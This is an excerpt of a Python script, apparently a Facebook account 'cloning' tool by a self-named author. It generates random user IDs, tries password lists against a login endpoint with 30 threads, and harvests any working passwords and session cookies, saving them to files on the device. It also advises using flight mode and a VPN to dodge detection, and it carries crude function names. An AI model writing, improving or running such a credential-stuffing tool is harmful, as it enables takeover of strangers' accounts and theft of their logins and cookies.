...
ua = "Mozilla/5.0 (Linux; Android 11; Infinix X689 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/430.1.0.5.109;FBCX/modulariab;]"
...
'\x1b[1;96m88888b  .d8b.  d8888b.  .d8b.  d88888D  .d88b.  
'\x1b[1;96m88'     d8' `8b 88  `8D d8' `8b YP  d8' .8P  Y8. 
'\x1b[1;96m88ooo   88ooo88 88oobY' 88ooo88    d8'  88    88 
'\x1b[1;96m88~~~   88~~~88 88`8b   88~~~88   d8'   88    88 
'\x1b[1;96m88      88   88 88 `88. 88   88  d8' db `8b  d8' 
'\x1b[1;96m        YP   YP 88   YD YP   YP d88888P  `Y88P'  
                            ( FaRaZ-LaLa )
                            
|||•• LoVe FoR NeW UsEr ••|||  
\n------------------------------------------------
[] OWNER      : FARAZ KHAN
[] GITHUB     : PR0F3SS0R-FARAZ
[] STATUS     : FREE 
[] TOOLS      : RANDOM
[] VERSION    : 1.0
---------------------------------""")  
...
def main():
    ____banner____()
    print("[1] FILE CLONE  COMMING SOON ")
    print("[2] START OLD RANDOM  CLONE ")
    print("[3] REQUEST FACEBOOK ACCOUNT")
    ...
    if select == "1":
    	print("faraz")
    if select == "3":
    	os.system('xdg-open https://www.facebook.com/H4CK3R.D4D4.F4R4Z0?mibextid=kFxxJD')
    	print("faraz")
    if select == "0":
        print("faraz")
...
def fuckMyxAXN(series):
    ____banner____()
    os.system("xdg-open https://.youtube.com/@farazocreation9217")
    global gen
    if series == "100000":
        SEX = "100000"
        SEX2 = 9
    ...
    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
        ...
        print("USE FLIGHT MODE EVERY 3 MINT")
        print("USE  VPN FOR GOOD RESULT")
        print("-------------------------------")
        for love in gen:
            ids = SEX + love
...
def Fucking_life(ids, passlist):
    global loop, oks, cps
    sys.stdout.write(f"\r[FARAZ-4T7] [{loop}]|OK:[{len(cps)}]")
    sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if "access_token" in response:
                print(f"\r\r\x1b| FARAZO-OK | {ids} • {pas}")
...
def FUCK_XNXXX():
    ...
    clear()
    ____banner____()
    os.system("xdg-open https://t.me/youtube.com/@farazocreation9217")
...
def FUCK_FRIEND(ids,passlist):
    ...
    try:
        for pas in passlist:
            sys.stdout.write(f'\r\x1b[[\x1b[FARAZO\x1b[]\x1b[-\x1b[[[{loop}\x1b[]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK-{len(oks)}\x1b[]')
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[FARAZO] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[3;34m [COOKIE_❇️] '+coki)
                    open('/sdcard/farazkhan.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;35m[FARAZ-4T7] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/FARAZ-4T7.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
